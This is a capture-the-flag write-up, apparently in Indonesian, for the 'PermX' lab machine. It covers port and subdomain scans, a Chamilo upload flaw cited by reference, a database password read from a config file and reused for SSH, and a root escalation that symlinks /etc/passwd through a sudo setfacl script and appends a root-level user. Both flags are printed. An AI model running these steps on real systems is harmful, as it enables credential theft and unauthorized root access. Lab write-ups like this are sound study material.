**Nmap Scan Report for 10.10.11.23**
=====================================

Starting Nmap 7.94SVN (https://nmap.org) at 2024-07-08 15:47 WIB

**Host is up (0.34s latency).**

**Not shown: 993 closed tcp ports (conn-refused)**

**Open Ports:**
| Port | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open | http | Apache httpd 2.4.52 |
| 801/tcp | filtered | device | |
| 1072/tcp | filtered | cardax | |
| 1086/tcp | filtered | cplscrambler-lg | |
| 8500/tcp | filtered | fmtp | |
| 10003/tcp | filtered | documentum_s | |

**Service Information:**
* Host: 127.0.1.1
* OS: Linux
* CPE: cpe:/o:linux:linux_kernel

**Service Detection:**
Service detection performed. Please report any incorrect results at https://nmap.org/submit/.

**Nmap Done:**
1 IP address (1 host up) scanned in 134.34 seconds

**FFuf Scan Results**
=====================

**Method:** GET
**URL:** http://permx.htb
**Wordlist:** /home/aexon/tools/wordlist/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
**Header:** Host: FUZZ.permx.htb
**Follow redirects:** false
**Calibration:** false
**Timeout:** 10
**Threads:** 40
**Matcher:** Response status: 200-299,301,302,307,401,403,405,500
**Filter:** Response words: 18

**Scan Results:**

| Subdomain | Status | Size  | Words | Lines | Duration |
| --------- | ------ | ----- | ----- | ----- | -------- |
| www       | 200    | 36182 | 12829 | 587   | 1280ms   |
| lms       | 200    | 19347 | 4910  | 353   | 363ms    |
# USER FLAG

terdapat vuln file upload
refrensi: https://starlabs.sg/advisories/23/23-4220/


saya menemukan credentsial mysql di file path

```bash
(remote) www-data@permx:/var/www/chamilo/app/config$ cat configuration.php


// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

connect ke mysql
```bash
 mysql -u chamilo -p chamilo
```

ada beberapa hash

```
$2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra -> admin
$2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS -> anon
```

dan kocak nya saya crack semua password wwkwkwk, padahal password db itu password ssh nya wkwkw

```bash
ssh mtz@permx.htb
03F6lY3uXAP2bkW8
```

flag: a509e12378152f21bdaa4702bc2d7c22


# ROOT

```bash
mtz@permx:/tmp$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh


mtz@permx:/tmp$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```


## EXPLOIT

```bash
mtz@permx:~$ ln -s /etc/passwd /home/mtz/Aexon
mtz@permx:~$ ls -al
total 36
drwxr-x--- 5 mtz  mtz  4096 Jul  8 11:09 .
drwxr-xr-x 3 root root 4096 Jan 20 18:10 ..
lrwxrwxrwx 1 root root    9 Jan 20 18:12 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31 11:14 .cache
drwxrwxr-x 3 mtz  mtz  4096 Jul  8 10:22 .local
lrwxrwxrwx 1 root root    9 Jan 20 18:37 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20 18:10 .ssh
lrwxrwxrwx 1 mtz  mtz    11 Jul  8 11:09 Aexon -> /etc/passwd
-rw-r----- 1 root mtz    33 Jul  8 10:01 user.txt
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/Aexon 
mtz@permx:~$ ls -lah /etc/passwd
-rw-rwxr--+ 1 root root 1.9K Jul  8 11:09 /etc/passwd
mtz@permx:~$ echo 'aexon:openssl passwd -6 aexon^C
mtz@permx:~$ openssl passwd -6 aexon
$6$4eW1JkxsZwiIJH4M$BQIeFg82XUCf6qXYQ0.3e/AC6MipAtamyEjuExPbJAyYjtAELyDTRimkwswwaDlSNFkr5BjM/C/W/nGXNFkPZ0
mtz@permx:~$ echo 'aexon:$6$4eW1JkxsZwiIJH4M$BQIeFg82XUCf6qXYQ0.3e/AC6MipAtamyEjuExPbJAyYjtAELyDTRimkwswwaDlSNFkr5BjM/C/W/nGXNFkPZ0:0:0:root:/root:/bin/bash' >> /etc/passwd
mtz@permx:~$ su aexon
Password: 
root@permx:/home/mtz# cat /root/root.txt
b240d1b3dbbdbeb6d09c469183f80945
root@permx:/home/mtz# 
```

